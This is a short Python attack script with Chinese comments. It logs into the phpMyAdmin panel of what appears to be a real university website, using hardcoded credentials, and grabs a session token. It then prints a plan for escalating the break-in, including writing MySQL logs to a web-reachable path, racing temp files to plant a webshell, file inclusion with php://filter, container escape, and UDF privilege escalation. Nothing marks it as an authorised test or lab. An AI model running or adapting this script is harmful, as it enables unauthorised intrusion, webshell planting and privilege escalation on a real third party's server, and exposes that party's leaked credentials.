#!/usr/bin/env python3
import requests
import urllib3
import re
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {'pma_username': 'mysql', 'pma_password': 'Mu123.123.', 'server': '1'}
resp = session.post(url + 'index.php', data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print("[*] 深度分析突破思路...")
print("")

# 思路1: 通过MySQL日志获取输出
print("[+] 思路1: MySQL日志获取输出")
print("  - 启用general_log到web可访问位置")
print("  - 执行命令会记录到日志")
print("  - 通过web访问日志获取输出")

# 思路2: PHP错误日志
print("\n[+] 思路2: PHP错误日志")
print("  - 执行命令触发PHP错误")
print("  - 错误信息写入日志")
print("  - 通过文件包含读取日志")

# 思路3: 临时文件竞争
print("\n[+] 思路3: 临时文件竞争")
print("  - phpMyAdmin导出功能创建临时文件")
print("  - 竞争写入webshell")
print("  - 通过临时文件获取shell")

# 思路4: MySQL触发器
print("\n[+] 思路4: MySQL触发器")
print("  - 创建触发器执行命令")
print("  - 通过数据库操作触发")

# 思路5: 检查是否有其他web应用
print("\n[+] 思路5: 其他web应用")
print("  - 扫描其他端口")
print("  - 检查是否有其他CMS")
print("  - 检查是否有管理后台")

# 思路6: 文件包含 + PHP过滤器
print("\n[+] 思路6: 文件包含 + PHP过滤器")
print("  - 利用php://filter读取文件")
print("  - base64编码绕过限制")

# 思路7: 检查Docker/容器
print("\n[+] 思路7: 容器逃逸")
print("  - 检查是否在容器中")
print("  - 检查Docker socket")
print("  - 检查Kubernetes")

# 思路8: 检查MySQL是否以root运行
print("\n[+] 思路8: MySQL运行权限")
print("  - 检查MySQL进程用户")
print("  - 如果是root，UDF提权更容易")

print("\n[*] 开始执行突破尝试...")
